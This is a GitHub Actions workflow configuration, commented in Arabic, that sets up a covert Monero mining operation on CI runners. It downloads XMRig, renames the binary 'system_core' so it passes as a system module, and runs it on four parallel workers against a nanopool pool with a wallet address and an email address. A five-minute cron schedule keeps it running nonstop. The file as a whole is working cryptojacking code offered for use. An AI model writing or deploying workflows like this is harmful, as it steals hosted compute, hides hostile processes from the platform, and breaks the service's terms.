name: Max-Whale-X4-NonStop
on:
  push:
    branches: [ main ]
  workflow_dispatch:
  schedule:
    - cron: "*/5 * * * *" # نبضة كل 5 دقائق للتأكد من التشغيل

jobs:
  mining-fleet:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        # هنا بنفتح 4 سيرفرات مستقلة تماماً داخل الحساب
        worker_id: [1, 2, 3, 4]
    steps:
      - name: System-Setup
        run: |
          # تحميل صامت وتمويه العملية
          curl -L -o sys_module.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
          tar -xf sys_module.tar.gz
          mv xmrig-6.21.0/xmrig ./system_core
          chmod +x system_core

      - name: Live-Mining
        run: |
          # التشغيل بـ 2 ثريدز لكل عامل لضمان استلام الهاش
          ./system_core -o xmr-eu1.nanopool.org:14444 \
          -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.WhaleX4-${{ matrix.worker_id }}/nfdr065@gmail.com \
          --algo rx/0 -p x --donate-level 1 -t 2
